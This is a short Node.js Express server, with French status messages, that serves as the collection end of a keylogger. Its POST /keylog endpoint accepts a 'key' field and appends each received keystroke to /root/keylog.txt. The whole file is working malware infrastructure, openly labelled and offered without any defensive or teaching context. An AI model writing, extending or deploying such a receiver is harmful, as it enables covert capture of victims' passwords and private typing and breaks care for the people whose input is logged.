const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const LOG_FILE = '/root/keylog.txt';

app.use(express.json());

app.post('/keylog', (req, res) => {
    try {
        const { key } = req.body;
        if (!key) {
            return res.status(400).json({ error: 'Aucune touche reçue.' });
        }
        fs.appendFile(LOG_FILE, key + '\n', (err) => {
            if (err) {
                console.error('Erreur lors de l\'écriture du fichier :', err);
                return res.status(500).json({ error: 'Erreur serveur.' });
            }
            res.status(200).json({ message: 'Touche enregistrée.' });
        });
    } catch (error) {
        console.error('Erreur inattendue :', error);
        res.status(500).json({ error: 'Erreur serveur.' });
    }
});

app.listen(PORT, () => {
    console.log(`Serveur démarré sur le port ${PORT}`);
});
